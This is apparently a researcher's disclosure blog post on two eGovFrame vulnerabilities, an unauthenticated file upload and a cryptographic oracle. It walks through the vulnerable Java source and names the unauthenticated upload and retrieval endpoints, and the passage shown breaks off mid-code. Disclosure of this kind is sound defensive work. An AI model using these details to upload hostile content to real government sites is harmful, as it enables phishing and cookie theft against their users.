<!DOCTYPE html>
<html>
<head>
<title>2 vulnerabilities in Egovframe - IT Security Research by Pierre</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="css/bootstrap.min.css" rel="stylesheet">
<link href="feed.xml" rel="alternate" type="application/rss+xml" title="Blog" />
<style>
body {
    font-family: sans-serif;
    background-color: #fff;
    font-size: 16px;
}
h1, h2, h3, h4 {
    font-family: arial;
}
.container {
    max-width: 900px;
}
.footer {
    margin-top: 50px;
    font-size: 12px;
    text-align: center;
}
</style>
</head>
<body>
<div class="container">
    <div class="hero-unit faq">
        <div class="ac" style="text-align: center;">
            <h1>IT Security Research by Pierre</h1>
            <a href="../index.html">Home</a> &bull; <a href="about.html">About</a>  &bull; <a href="feed.xml">Feed</a>
        </div>
    </div>
    
<div class="hero-unit faq">
    <div class="ac">
        <h2>2 vulnerabilities in Egovframe</h2>
    </div>
</div>

<div>
    <h2>Product description</h2>
<blockquote>
<p>eGovFrame, the e-Government Standard Framework, is a platform-specific standardized development framework for public sector IT projects in Korea.
It is developed by the government of the Republic of Korea and can be used by every person all over the world.</p>
<p>From <a href="https://www.egovframe.go.kr/eng/sub.do?menuNo=2">https://www.egovframe.go.kr/eng/sub.do?menuNo=2</a></p>
</blockquote>
<p>Egovframe is a Java-based framework mainly used in the websites of the Government of South Korea (Korea).</p>
<h2>Vulnerabilities Summary</h2>
<p>Vulnerable versions: currently existing all versions.</p>
<p>The summary of the vulnerabilities is:</p>
<ol>
<li><a href="#file-upload">CVE-2025-34336 - Unauthenticated file upload vulnerability</a><br></li>
<li><a href="#oracle">CVE-2025-34337 - Pre-authenticated Cryptographic Oracle</a></li>
</ol>
<p><em>Miscellaneous notes</em>:</p>
<p>These vulnerabilities were discovered in March 2023 after a brief security assessment (2-3 hours) on egovframe and were reported to KrCERT in April 2023 through POC Security, a Korean cybersecurity company acting as a trusted third party.</p>
<p>Due to previous bad experiences when reporting vulnerabilities directly to KrCERT, I preferred using a reputable Korean cybersecurity company - POC Security - who could act as a third party. The initial advisories were given to POC Security at the Zer0con conference in April 2023.</p>
<p>In August 2023, KISA confirmed that the vulnerabilities were exploitable. In October 2023, KISA confirmed that the vulnerabilities had been patched. In September 2025, I confirmed that the following vulnerabilities had not been properly patched.</p>
<p>These vulnerabilities allow an unauthenticated remote attacker to upload any file to websites based on "egovframework", a solution widely used on Korean government websites.</p>
<p>Furthermore, this program does not appear to be tracked by CVE identifiers. Instead, KVE identifiers are used:</p>
<blockquote>
<p>KVE stands for Korea Vulnerabilities and Exposures, which is a system used in South Korea for cataloging and tracking security vulnerabilities. Contrary to CVEs and CNNVDs, it is unclear if KVE entries  are public.</p>
</blockquote>
<p>Analyzing the source code and searching for "KISA" (the agency managing KrCERT), I could find approximately 260 mentions of vulnerabilities fixed by KISA. It appears that these vulnerabilities were not publicly tracked outside of the source code (I found only three KVE-2025-XXXX entries in a PDF file announcing a new release).</p>
<p>We can list the vulnerabilities detected and fixed by KISA by searching for comments containing "KISA" and "YYYY-MM-DD". Unfortunately, the reported vulnerabilities are not found there.</p>
<pre><code>kali% for i in $(seq 2010 2025);do echo -n "$i - "; rgrep "$i" |grep -c KISA | grep -v ' - 0$';done
2012 - 6
2018 - 161
2019 - 65
2020 - 18
2022 - 1
2024 - 1
2025 - 2
kali%
</code></pre>
<p>For example: <a href="https://github.com/eGovFramework/egovframe-common-components/blob/main/src/main/java/egovframework/com/utl/sys/pxy/web/EgovProxySvcController.java#L176">https://github.com/eGovFramework/egovframe-common-components/blob/main/src/main/java/egovframework/com/utl/sys/pxy/web/EgovProxySvcController.java#L176</a>.</p>
<p>We also note that <a href="https://github.com/eGovFramework/egovframe-common-components/releases">all version changelogs indicate that some vulnerabilities have been fixed without any information</a>.</p>
<p>Since vulnerability tracking is quite difficult, using this solution seems like a questionable choice from a risk management point of view.</p>
<p>On a positive note, these results mean there is plenty of room for improvement.</p>
<p><em>Impacts</em></p>
<p>An unauthenticated remote attacker can upload any file to any website based on the egovframework. Since the content type was controlled by the attacker (up to version 4.1.2), it was possible to host any type of content on the remote website, such as a phishing webpage or a webpage with JavaScript to steal cookies. Since version 4.1.2, it is possible to download any image uploaded with the correct content type.
Any file uploaded other than an image will be served with the <code>application/octet-stream</code> content type (the content type is no longer controlled by the attacker).</p>
<p>The malicious file will then be available on the targeted website via a specific API accessible without authentication.</p>
<p>It is possible to exploit a cryptographic Oracle to create valid and custom encrypted variables. These malicious encrypted strings will be then fully trusted and can be used to abuse internal services.</p>
<p><em>Recommendations</em></p>
<p>Do not expose Egovframe-based websites on the Internet.</p>
<h2>Unpatched vulnerabilities</h2>
<p>Vulncheck assigned the following CVEs in November 2025:</p>
<ul>
<li>CVE-2025-34336 - eGovFramework &lt;= 4.3.1 Unauthenticated File Upload via Web Editor Image Upload Endpoints</li>
<li>CVE-2025-34337 - eGovFramework &lt;= 4.3.1 Unauthenticated Encryption Oracle via Web Editor Image Upload Endpoints</li>
</ul>
<p>These KVEs have been assigned by KISA/KrCERT:</p>
<ul>
<li>KVE-2023-5280 Unauthenticated File upload in egovframework</li>
<li>KVE-2023-5281 encryption Oracle to craft custom valid encrypted variables</li>
</ul>
<h2>Identification of the solution</h2>
<p>For this advisory, the latest version as of the date of this security advisory was obtained via the official git repository at <a href="https://github.com/eGovFramework/egovframe-common-components">https://github.com/eGovFramework/egovframe-common-components</a>.</p>
<p>The latest commit is:</p>
<pre><code>commit 7030600a8d959fbdb09787cd346be9ccf2c2dc1c (HEAD -&gt; main, origin/main, origin/HEAD)
Merge: e10475cc b354bbb7
Author: eGovFrameSupport &lt;egovframesupport@gmail.com&gt;
Date:   Wed Sep 24 14:49:27 2025 +0900
</code></pre>
<p>There were some changes in the source codes since March 2023, including a incorrect attempt to fix one of the vulnerabilities after I reported it - it is unclear if this was a bug collision (someone else was credited for this vulnerability in the source codes).</p>
<p><a id="file-upload"></a></p>
<h2>Details - Unauthenticated file upload vulnerability</h2>
<p>An attacker can upload any file without authentication on a website developed with the egov framework.</p>
<p>The vulnerable component <code>egovframe-common-components</code> is used by the egovframe framework.</p>
<p>The <code>/utl/wed/insertImage.do</code> and <code>/utl/wed/insertImageCk.do</code> POST APIs defined in the <code>egovframe-common-components/src/main/java/egovframework/com/utl/wed/web/EgovWebEditorImageController.java</code> file do not implement authentication as shown below:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">60</span>         <span style="color: #008000; font-weight: bold">private</span> <span style="color: #008000; font-weight: bold">final</span> String extWhiteList <span style="color: #666666">=</span> EgovProperties<span style="color: #666666">.</span><span style="color: #7D9029">getProperty</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;Globals.fileDownload.Extensions&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">[...]</span>
 <span style="color: #666666">76</span>         <span style="color: #408080; font-style: italic">/**</span>
<span style="color: #408080; font-style: italic"> 77          * ??? Upload? ????.</span>
<span style="color: #408080; font-style: italic"> 78          *</span>
<span style="color: #408080; font-style: italic"> 79          * @param model</span>
<span style="color: #408080; font-style: italic"> 80          * @return</span>
<span style="color: #408080; font-style: italic"> 81          * @throws Exception</span>
<span style="color: #408080; font-style: italic"> 82          */</span>
 <span style="color: #666666">83</span>         <span style="color: #AA22FF">@RequestMapping</span><span style="color: #666666">(</span>value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;/utl/wed/insertImage.do&quot;</span><span style="color: #666666">,</span> method<span style="color: #666666">=</span>RequestMethod<span style="color: #666666">.</span><span style="color: #7D9029">GET</span><span style="color: #666666">)</span>
 <span style="color: #666666">84</span>         <span style="color: #008000; font-weight: bold">public</span> String <span style="color: #0000FF">goInsertImage</span><span style="color: #666666">(</span>Model model<span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throws</span> Exception <span style="color: #666666">{</span>
 <span style="color: #666666">85</span> 
 <span style="color: #666666">86</span>                 <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;egovframework/com/utl/wed/EgovInsertImage&quot;</span><span style="color: #666666">;</span>
 <span style="color: #666666">87</span>         <span style="color: #666666">}</span>
 <span style="color: #666666">88</span> 
 <span style="color: #666666">89</span> 
 <span style="color: #666666">90</span>         <span style="color: #408080; font-style: italic">/**</span>
<span style="color: #408080; font-style: italic"> 91          * ??? Upload? ????.</span>
<span style="color: #408080; font-style: italic"> 92          *</span>
<span style="color: #408080; font-style: italic"> 93          * @param request</span>
<span style="color: #408080; font-style: italic"> 94          * @param model</span>
<span style="color: #408080; font-style: italic"> 95          * @return</span>
<span style="color: #408080; font-style: italic"> 96          * @throws Exception</span>
<span style="color: #408080; font-style: italic"> 97          */</span>
 <span style="color: #666666">98</span>         <span style="color: #AA22FF">@RequestMapping</span><span style="color: #666666">(</span>value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;/utl/wed/insertImage.do&quot;</span><span style="color: #666666">,</span> method<span style="color: #666666">=</span>RequestMethod<span style="color: #666666">.</span><span style="color: #7D9029">POST</span><span style="color: #666666">)</span>
 <span style="color: #666666">99</span>         <span style="color: #008000; font-weight: bold">public</span> String <span style="color: #0000FF">imageUpload</span><span style="color: #666666">(</span>MultipartHttpServletRequest request<span style="color: #666666">,</span> Model model<span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throws</span> Exception <span style="color: #666666">{</span>
<span style="color: #666666">100</span> 
<span style="color: #666666">101</span>                 uploadImageFiles<span style="color: #666666">(</span>request<span style="color: #666666">,</span> model<span style="color: #666666">);</span>
<span style="color: #666666">102</span>                 <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;egovframework/com/utl/wed/EgovInsertImage&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">103</span>         <span style="color: #666666">}</span>
<span style="color: #666666">104</span> 
<span style="color: #666666">105</span>         <span style="color: #408080; font-style: italic">/**</span>
<span style="color: #408080; font-style: italic">106          * ??? Upload(CK???)? ????.</span>
<span style="color: #408080; font-style: italic">107          *</span>
<span style="color: #408080; font-style: italic">108          * @param ckEditorFuncNum</span>
<span style="color: #408080; font-style: italic">109          * @param mRequest</span>
<span style="color: #408080; font-style: italic">110          * @param response</span>
<span style="color: #408080; font-style: italic">111          * @param model</span>
<span style="color: #408080; font-style: italic">112          * @return</span>
<span style="color: #408080; font-style: italic">113          * @throws Exception</span>
<span style="color: #408080; font-style: italic">114          */</span>
<span style="color: #666666">115</span>         <span style="color: #AA22FF">@RequestMapping</span><span style="color: #666666">(</span>value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;/utl/wed/insertImageCk.do&quot;</span><span style="color: #666666">,</span> method<span style="color: #666666">=</span>RequestMethod<span style="color: #666666">.</span><span style="color: #7D9029">POST</span><span style="color: #666666">)</span>
<span style="color: #666666">116</span>         <span style="color: #008000; font-weight: bold">public</span> String <span style="color: #0000FF">imageUploadCk</span><span style="color: #666666">(</span><span style="color: #AA22FF">@RequestParam</span><span style="color: #666666">(</span>value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;CKEditorFuncNum&quot;</span><span style="color: #666666">,</span> required<span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">false</span><span style="color: #666666">)</span> String ckEditorFuncNum<span style="color: #666666">,</span> MultipartHttpServletRequest mRequest<span style="color: #666666">,</span> HttpServletResponse response<span style="color: #666666">,</span> Model model<span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throws</span> Exception <span style="color: #666666">{</span>
<span style="color: #666666">117</span>                 <span style="color: #408080; font-style: italic">// Spring multipartResolver ?commons-fileupload?</span>
<span style="color: #666666">118</span>                 <span style="color: #408080; font-style: italic">//List&lt;EgovFormBasedFileVo&gt; list = EgovFormBasedFileUtil.uploadFiles(request, uploadDir, maxFileSize);</span>
<span style="color: #666666">119</span>                 model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;ckEditorFuncNum&quot;</span><span style="color: #666666">,</span> ckEditorFuncNum<span style="color: #666666">);</span>
<span style="color: #666666">120</span>                 uploadImageFiles<span style="color: #666666">(</span>mRequest<span style="color: #666666">,</span> model<span style="color: #666666">);</span>
<span style="color: #666666">121</span>                 <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;egovframework/com/utl/wed/EgovUploadImageComplete&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">122</span>         <span style="color: #666666">}</span>
</pre></div>

<p>These APIs will ultimately call the method <code>uploadImageFiles()</code> defined on line 129:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">124</span>         <span style="color: #408080; font-style: italic">/**</span>
<span style="color: #408080; font-style: italic">125          * @param mRequest</span>
<span style="color: #408080; font-style: italic">126          * @param model</span>
<span style="color: #408080; font-style: italic">127          * @throws Exception</span>
<span style="color: #408080; font-style: italic">128          */</span>
<span style="color: #666666">129</span>         <span style="color: #008000; font-weight: bold">private</span> <span style="color: #B00040">void</span> <span style="color: #0000FF">uploadImageFiles</span><span style="color: #666666">(</span>MultipartHttpServletRequest mRequest<span style="color: #666666">,</span> Model model<span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throws</span> Exception <span style="color: #666666">{</span>
<span style="color: #666666">130</span> 
<span style="color: #666666">131</span>                 <span style="color: #008000; font-weight: bold">try</span> <span style="color: #666666">{</span>
<span style="color: #666666">132</span>                         List<span style="color: #666666">&lt;</span>EgovFormBasedFileVo<span style="color: #666666">&gt;</span> list <span style="color: #666666">=</span> EgovFileUploadUtil<span style="color: #666666">.</span><span style="color: #7D9029">uploadFilesExt</span><span style="color: #666666">(</span>mRequest<span style="color: #666666">,</span> uploadDir<span style="color: #666666">,</span> maxFileSize<span style="color: #666666">,</span> extWhiteList<span style="color: #666666">);</span>
<span style="color: #666666">133</span>                         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>list<span style="color: #666666">.</span><span style="color: #7D9029">size</span><span style="color: #666666">()</span> <span style="color: #666666">&gt;</span> <span style="color: #666666">0)</span> <span style="color: #666666">{</span>
<span style="color: #666666">134</span>                                 EgovFormBasedFileVo vo <span style="color: #666666">=</span> list<span style="color: #666666">.</span><span style="color: #7D9029">get</span><span style="color: #666666">(0);</span>   <span style="color: #408080; font-style: italic">// ??? ???</span>
<span style="color: #666666">135</span> 
<span style="color: #666666">136</span>                                 String url <span style="color: #666666">=</span> mRequest<span style="color: #666666">.</span><span style="color: #7D9029">getContextPath</span><span style="color: #666666">()</span>
<span style="color: #666666">137</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;/utl/web/imageSrc.do?&quot;</span>
<span style="color: #666666">138</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;path=&quot;</span> <span style="color: #666666">+</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">encrypt</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getServerSubPath</span><span style="color: #666666">())</span>
<span style="color: #666666">139</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;&amp;physical=&quot;</span> <span style="color: #666666">+</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">encrypt</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getPhysicalName</span><span style="color: #666666">())</span>
<span style="color: #666666">140</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;&amp;contentType=&quot;</span> <span style="color: #666666">+</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">encrypt</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getContentType</span><span style="color: #666666">());</span>
<span style="color: #666666">141</span> 
<span style="color: #666666">142</span>                                 model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;url&quot;</span><span style="color: #666666">,</span> url<span style="color: #666666">);</span>
<span style="color: #666666">143</span>                                 model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;msg&quot;</span><span style="color: #666666">,</span>egovMessageSource<span style="color: #666666">.</span><span style="color: #7D9029">getMessage</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;success.file.transfer&quot;</span><span style="color: #666666">));</span>
<span style="color: #666666">144</span>                         <span style="color: #666666">}</span>
<span style="color: #666666">145</span>                 <span style="color: #666666">}</span> <span style="color: #008000; font-weight: bold">catch</span> <span style="color: #666666">(</span>SecurityException e<span style="color: #666666">)</span> <span style="color: #666666">{</span>
<span style="color: #666666">146</span>                         model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;url&quot;</span><span style="color: #666666">,</span> <span style="color: #BA2121">&quot;&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">147</span>                         model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;msg&quot;</span><span style="color: #666666">,</span>egovMessageSource<span style="color: #666666">.</span><span style="color: #7D9029">getMessage</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;errors.file.extension&quot;</span><span style="color: #666666">));</span>
<span style="color: #666666">148</span>                 <span style="color: #666666">}</span> <span style="color: #008000; font-weight: bold">catch</span> <span style="color: #666666">(</span>Exception e<span style="color: #666666">)</span> <span style="color: #666666">{</span>
<span style="color: #666666">149</span>                         LOGGER<span style="color: #666666">.</span><span style="color: #7D9029">error</span><span style="color: #666666">(</span>e<span style="color: #666666">.</span><span style="color: #7D9029">getMessage</span><span style="color: #666666">());</span>
<span style="color: #666666">150</span>                         model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;url&quot;</span><span style="color: #666666">,</span> <span style="color: #BA2121">&quot;&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">151</span>                         model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;msg&quot;</span><span style="color: #666666">,</span>egovMessageSource<span style="color: #666666">.</span><span style="color: #7D9029">getMessage</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;errors.file.transfer&quot;</span><span style="color: #666666">));</span>
<span style="color: #666666">152</span>                 <span style="color: #666666">}</span>
<span style="color: #666666">153</span>         <span style="color: #666666">}</span>
</pre></div>

<p>The <code>uploadFilesExt()</code> method is implemented in <code>egovframe-common-components/src/main/java/egovframework/com/utl/fcc/service/EgovFileUploadUtil.java</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">113</span>         <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> List<span style="color: #666666">&lt;</span>EgovFormBasedFileVo<span style="color: #666666">&gt;</span> <span style="color: #0000FF">uploadFilesExt</span><span style="color: #666666">(</span>MultipartHttpServletRequest mptRequest<span style="color: #666666">,</span> String where<span style="color: #666666">,</span> <span style="color: #B00040">long</span> maxFileSize<span style="color: #666666">,</span> String extensionWhiteList<span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throws</span> Exception <span style="color: #666666">{</span>
<span style="color: #666666">114</span>                 List<span style="color: #666666">&lt;</span>EgovFormBasedFileVo<span style="color: #666666">&gt;</span> list <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> ArrayList<span style="color: #666666">&lt;</span>EgovFormBasedFileVo<span style="color: #666666">&gt;();</span>
<span style="color: #666666">[...]</span>
<span style="color: #666666">115</span> 
<span style="color: #666666">116</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>mptRequest <span style="color: #666666">!=</span> <span style="color: #008000; font-weight: bold">null</span><span style="color: #666666">)</span> <span style="color: #666666">{</span>
<span style="color: #666666">117</span>                         Iterator<span style="color: #666666">&lt;?&gt;</span> fileIter <span style="color: #666666">=</span> mptRequest<span style="color: #666666">.</span><span style="color: #7D9029">getFileNames</span><span style="color: #666666">();</span>
<span style="color: #666666">118</span> 
<span style="color: #666666">119</span>                         <span style="color: #008000; font-weight: bold">while</span> <span style="color: #666666">(</span>fileIter<span style="color: #666666">.</span><span style="color: #7D9029">hasNext</span><span style="color: #666666">())</span> <span style="color: #666666">{</span>
<span style="color: #666666">120</span>                                 MultipartFile mFile <span style="color: #666666">=</span> mptRequest<span style="color: #666666">.</span><span style="color: #7D9029">getFile</span><span style="color: #666666">((</span>String<span style="color: #666666">)</span>fileIter<span style="color: #666666">.</span><span style="color: #7D9029">next</span><span style="color: #666666">());</span>
<span style="color: #666666">[...]</span>
<span style="color: #666666">127</span>                                 EgovFormBasedFileVo vo <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> EgovFormBasedFileVo<span style="color: #666666">();</span>
<span style="color: #666666">128</span> 
<span style="color: #666666">129</span>                                 String tmp <span style="color: #666666">=</span> mFile<span style="color: #666666">.</span><span style="color: #7D9029">getOriginalFilename</span><span style="color: #666666">();</span>
<span style="color: #666666">[...]</span> <span style="color: #408080; font-style: italic">// verification of the extension:</span>
<span style="color: #666666">138</span>                                         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>tmp<span style="color: #666666">.</span><span style="color: #7D9029">lastIndexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;.&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">&gt;</span> <span style="color: #666666">0)</span> <span style="color: #666666">{</span>
<span style="color: #666666">139</span>                                                 ext <span style="color: #666666">=</span> getFileExtension<span style="color: #666666">(</span>tmp<span style="color: #666666">).</span><span style="color: #7D9029">toLowerCase</span><span style="color: #666666">();</span>
<span style="color: #666666">140</span>                                         <span style="color: #666666">}</span> <span style="color: #008000; font-weight: bold">else</span> <span style="color: #666666">{</span>
<span style="color: #666666">141</span>                                                 <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> SecurityException<span style="color: #666666">(</span><span style="color: #BA2121">&quot;Unacceptable file extension.&quot;</span><span style="color: #666666">);</span> <span style="color: #408080; font-style: italic">// ??</span>
<span style="color: #666666">142</span>                                         <span style="color: #666666">}</span>
<span style="color: #666666">143</span>                                         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>extensionWhiteList<span style="color: #666666">.</span><span style="color: #7D9029">indexOf</span><span style="color: #666666">(</span>ext<span style="color: #666666">)</span> <span style="color: #666666">&lt;</span> <span style="color: #666666">0)</span> <span style="color: #666666">{</span>
<span style="color: #666666">144</span>                                                 <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> SecurityException<span style="color: #666666">(</span><span style="color: #BA2121">&quot;Unacceptable file extension.&quot;</span><span style="color: #666666">);</span> <span style="color: #408080; font-style: italic">// ??</span>
<span style="color: #666666">145</span>                                         <span style="color: #666666">}</span>
<span style="color: #666666">[...]</span> <span style="color: #408080; font-style: italic">// file is stored inside the filesystem:</span>
<span style="color: #666666">147</span>                                         vo<span style="color: #666666">.</span><span style="color: #7D9029">setFileName</span><span style="color: #666666">(</span>tmp<span style="color: #666666">);</span>
<span style="color: #666666">148</span>                                         vo<span style="color: #666666">.</span><span style="color: #7D9029">setContentType</span><span style="color: #666666">(</span>mFile<span style="color: #666666">.</span><span style="color: #7D9029">getContentType</span><span style="color: #666666">());</span>
<span style="color: #666666">149</span>                                         vo<span style="color: #666666">.</span><span style="color: #7D9029">setServerSubPath</span><span style="color: #666666">(</span>getTodayString<span style="color: #666666">());</span>
<span style="color: #666666">150</span>                                         vo<span style="color: #666666">.</span><span style="color: #7D9029">setPhysicalName</span><span style="color: #666666">(</span>getPhysicalFileName<span style="color: #666666">()</span> <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;.&quot;</span> <span style="color: #666666">+</span> ext<span style="color: #666666">);</span>
<span style="color: #666666">151</span>                                         vo<span style="color: #666666">.</span><span style="color: #7D9029">setSize</span><span style="color: #666666">(</span>mFile<span style="color: #666666">.</span><span style="color: #7D9029">getSize</span><span style="color: #666666">());</span>
<span style="color: #666666">152</span> 
<span style="color: #666666">153</span>                                         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>tmp<span style="color: #666666">.</span><span style="color: #7D9029">lastIndexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;.&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">&gt;=</span> <span style="color: #666666">0)</span> <span style="color: #666666">{</span>
<span style="color: #666666">154</span>                                                 vo<span style="color: #666666">.</span><span style="color: #7D9029">setPhysicalName</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getPhysicalName</span><span style="color: #666666">());</span> <span style="color: #408080; font-style: italic">// 2012.11 KISA ????</span>
<span style="color: #666666">155</span>                                         <span style="color: #666666">}</span>
<span style="color: #666666">156</span> 
<span style="color: #666666">157</span>                                         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>mFile<span style="color: #666666">.</span><span style="color: #7D9029">getSize</span><span style="color: #666666">()</span> <span style="color: #666666">&gt;</span> <span style="color: #666666">0)</span> <span style="color: #666666">{</span>
<span style="color: #666666">158</span>                                                 InputStream is <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span><span style="color: #666666">;</span>
<span style="color: #666666">159</span> 
<span style="color: #666666">160</span>                                                 <span style="color: #008000; font-weight: bold">try</span> <span style="color: #666666">{</span>
<span style="color: #666666">161</span>                                                         is <span style="color: #666666">=</span> mFile<span style="color: #666666">.</span><span style="color: #7D9029">getInputStream</span><span style="color: #666666">();</span>
<span style="color: #666666">162</span>                                                         String fullPath <span style="color: #666666">=</span> where <span style="color: #666666">+</span> SEPERATOR <span style="color: #666666">+</span> vo<span style="color: #666666">.</span><span style="color: #7D9029">getServerSubPath</span><span style="color: #666666">()</span> <span style="color: #666666">+</span> SEPERATOR <span style="color: #666666">+</span> vo<span style="color: #666666">.</span><span style="color: #7D9029">getPhysicalName</span><span style="color: #666666">()</span> <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;_upfile&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">163</span>                                                         saveFile<span style="color: #666666">(</span>is<span style="color: #666666">,</span> <span style="color: #008000; font-weight: bold">new</span> File<span style="color: #666666">(</span>EgovWebUtil<span style="color: #666666">.</span><span style="color: #7D9029">filePathBlackList</span><span style="color: #666666">(</span> fullPath <span style="color: #666666">)));</span>
<span style="color: #666666">164</span>                                                 <span style="color: #666666">}</span> <span style="color: #008000; font-weight: bold">finally</span> <span style="color: #666666">{</span>
<span style="color: #666666">165</span>                                                         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>is <span style="color: #666666">!=</span> <span style="color: #008000; font-weight: bold">null</span><span style="color: #666666">)</span> <span style="color: #666666">{</span>
<span style="color: #666666">166</span>                                                                 is<span style="color: #666666">.</span><span style="color: #7D9029">close</span><span style="color: #666666">();</span>
<span style="color: #666666">167</span>                                                         <span style="color: #666666">}</span>
<span style="color: #666666">168</span>                                                 <span style="color: #666666">}</span>
<span style="color: #666666">169</span>                                                 list<span style="color: #666666">.</span><span style="color: #7D9029">add</span><span style="color: #666666">(</span>vo<span style="color: #666666">);</span>
<span style="color: #666666">170</span>                                         <span style="color: #666666">}</span>
<span style="color: #666666">171</span>                                 <span style="color: #666666">}</span>
<span style="color: #666666">172</span>                         <span style="color: #666666">}</span>
<span style="color: #666666">173</span>                 <span style="color: #666666">}</span>
<span style="color: #666666">174</span> 
<span style="color: #666666">175</span>                 <span style="color: #008000; font-weight: bold">return</span> list<span style="color: #666666">;</span>
<span style="color: #666666">176</span>         <span style="color: #666666">}</span>
</pre></div>

<p>And the <code>saveFile()</code> method on line 163 will simply save the file on disk using <code>FileCopyUtils.copy()</code>.</p>
<p>Ultimately, the <code>uploadImageFiles()</code> method will store any uploaded file in the filesystem with a semi-controlled filename (composed with a UUID and a specific extension) but actually, the following values will be controlled by an attacker:</p>
<ul>
<li>the content;</li>
<li>the "public" filename, different from the filename used inside the file system;</li>
<li>the Content-Type that will be displayed to the remote client when the file is retrieved.</li>
</ul>
<p>We do not care about the real filename in the filesystem as we will use the <code>/utl/web/imageSrc.do</code> to retrieve the uploaded content.</p>
<p>Additionally, only specific extensions are allowed in the configuration files. These restrictions are defined in <a href="https://github.com/eGovFramework/egovframe-common-components/blob/main/src/main/resources/egovframework/egovProps/globals.properties#L168">https://github.com/eGovFramework/egovframe-common-components/blob/main/src/main/resources/egovframework/egovProps/globals.properties#L168</a>.</p>
<p>In any case, since the attacker is able to control the resulting Content-type, any file can be uploaded/downloaded (e.g. a file with the <code>.jpg</code> extension containing HTML code that will be returned as a HTML file when it is retrieved from the Internet).</p>
<p>Content of <code>egovframe-common-components/src/main/resources/egovframework/egovProps/globals.properties</code>:</p>
<pre><code>171 Globals.fileDownload.Extensions = .gif.jpg.jpeg.png
</code></pre>
<p>After the upload is done, an url will be displayed, allowing to retrieve the uploaded file. This URL is in the form of  <code>/utl/web/imageSrc.do?path=X&amp;physical=X&amp;contentType=X</code> (lines 136 to 142):</p>
<p>Content of <code>egovframe-common-components/src/main/java/egovframework/com/utl/wed/web/EgovWebEditorImageController.java</code> to illustrate how this URL is generated:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">136</span>                                 String url <span style="color: #666666">=</span> mRequest<span style="color: #666666">.</span><span style="color: #7D9029">getContextPath</span><span style="color: #666666">()</span>
